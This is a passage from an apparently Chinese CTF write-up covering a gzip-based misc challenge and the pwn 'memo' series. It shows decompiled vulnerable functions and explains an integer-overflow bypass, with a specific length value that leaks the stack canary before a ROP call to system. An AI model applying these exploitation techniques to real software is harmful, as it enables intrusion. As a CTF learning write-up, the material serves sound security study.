plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0xc44c8</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0xcc4f9</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0xd452a</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0xdc55b</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0xe458c</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0xec5bd</span><span class="token plain"> b5f977612e6028cc915d4696d27f1e4c</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0xf45ee</span><span class="token plain"> d654be24ae26570873990c441b74b80f</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0xfc61f</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x104650</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x10c681</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x1146b2</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x11c6e3</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x124714</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x12c745</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x134776</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x13c7a7</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x1447d8</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x14c809</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x15483a</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x15c86b</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x16489c</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x16c8cd</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x1748fe</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x17c92f</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x184960</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x18c991</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x1949c2</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x19c9f3</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x1a4a24</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x1aca55</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x1b4a86</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x1bcab7</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x1c4ae8</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x1ccb19</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x1d4b4a</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x1dcb7b</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x1e4bac</span><span class="token plain"> 57307bdd454f14e64a7d0c3e0d346070</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">0x1ecbdd</span><span class="token plain"> d30ed2b6a8ede0657a6b374d99f49ce0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>可以发现中间有跳变，前后都是一样的串。这些串只要保留一处就可以了，其他都可以删去。去除重复串后，再解压文件就没那么大了（也有60M）。注意因为gzip格式最后8个字节是CRC32校验码和长度，保存到文件解压会报错，但可以用zlib解压（其实也是看python gzip库的源码，hook掉CRC和长度的校验）解压出来是全NULL字节+flag的形式。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="pwn---memo系列23">pwn - memo系列（2/3）<a href="#pwn---memo系列23" class="hash-link" aria-label="pwn - memo系列（2/3）的直接链接" title="pwn - memo系列（2/3）的直接链接">​</a></h2>
<p>memo系列，前两问是比 较简单，第三问很难。</p>
<p>第一问要逆向一个密码。这个密码会modified base64编码后和全局字符串变量比较，但是注意程序初始化时在<code>DT_INIT_1</code>里还对字符串变量密码做了ascii + 1的操作。这个可以用gdb断点拿到b64编码，也可以写程序，怎么样都好。</p>
<p>第二问是在第一问基础上，进入后续的笔记管理系统。这个题保护全开，是一个基于栈的管理系统，可以增加、修改、展示、归零栈上的一条记录。其中<code>edit</code>函数会用<code>scanf</code>读取一个<code>%lld</code>作为读取长度，但后续<code>readline</code>函数长度是<code>uint</code>，所以有整数溢出漏洞，传负数可以绕过长度限制。另外，这个题readline只有当读入字符数刚好等于传入长度时，不会00截断。</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">FUN_001017f2_edit</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">param_1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">uint param_2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">long</span><span class="token plain"> in_FS_OFFSET</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">long</span><span class="token plain"> local_18</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">long</span><span class="token plain"> local_10</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  local_10 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">long</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">in_FS_OFFSET </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x28</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;How many characters do you want to change:&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token comment" style="color:#999988;font-style:italic">/* negative number overflow */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">__isoc99_scanf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;%lld&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">local_18</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token comment" style="color:#999988;font-style:italic">/* local_18 &lt; (0-0x100) ==0x118?? */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">local_18 </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">long</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ulong</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">param_2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">FUN_0010170e_readline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">param_1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">local_18</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">puts</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Done!&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">local_10 </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">long</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">in_FS_OFFSET </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x28</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token comment" style="color:#999988;font-style:italic">/* WARNING: Subroutine does not return */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">__stack_chk_fail</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">uint </span><span class="token function" style="color:#d73a49">FUN_0010170e_readline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain">param_1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">uint param_2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  uint local_c</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  local_c </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">while</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> true </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">param_2 </span><span class="token operator" style="color:#393A34">&lt;=</span><span class="token plain"> local_c</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> local_c</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">param_1 </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">local_c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">param_1</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">local_c</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token char">&#x27;\n&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">break</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    local_c </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> local_c </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  param_1</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">local_c</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token char">&#x27;\0&#x27;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> local_c</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这个题有个很神奇的解法，就是如果这里长度传<code>0xf000000000000109 - 0x10000 ** 4</code>，可以既让<code>edit</code>里的<code>local_18</code>是个负数绕过检查，又可以让<code>readline</code>里的<code>param_2</code>是个正数以保证截断。这样就泄露出canary了。后面就简单ROP调用一下system就行了。</p>
<p>第三问<code>edit</code>这里就改成<code>%u</code>了，同时整个笔记不在栈上，而是匿名mmap到堆上（ld上方，libc下方）。同时增加了一个sign函数，可以做到：读取相对于<code>mmap</code>基地址一个<code>uint</code>字节的位置（只能向高地址溢出了）8字节，进行一次<code>0x50</code>字节的栈溢出（canary在0x18, 返回地址在0x28），再修改刚刚读取地方的0x10字节。然后程序会直接调用<code>_exit</code>退出。</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">FUN_00101a19_sign</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> param_1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">long</span><span class="token plain"> in_FS_OFFSET</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  uint local_2c</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> local_28 </span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">24</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">long</span><span class="token plain"> local_10</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  local_10 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">long</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">in_FS_OFFSET </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x28</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Where would you like to sign(after the content): &quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">__isoc99_scanf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;%u&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">local_2c</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">DAT_00104130_mmap</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">local_2c</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token char">&#x27;\0&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;You will overwrite some content: &quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token comment" style="color:#999988;font-style:italic">/* this can leak addr, libc and mmap should be adjacent? */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">write</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">DAT_00104130_mmap </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> local_2c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">8</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">printf</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Enter your name: &quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token comment" style="color:#999988;font-style:italic">/* stackoverflow here, can trigger __stack_chk_fail */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">FUN_001017e9_readline</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">local_28</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x50</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token function" style="color:#d73a49">strncpy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">DAT_00104130_mmap </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> local_2c</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">local_28</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x10</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">local_10 </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">long</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">in_FS_OFFSET </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x28</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    </span><span class="token comment" style="color:#999988;font-style:italic">/* WARNING: Subroutine does not return */</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">__stack_chk_fail</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token 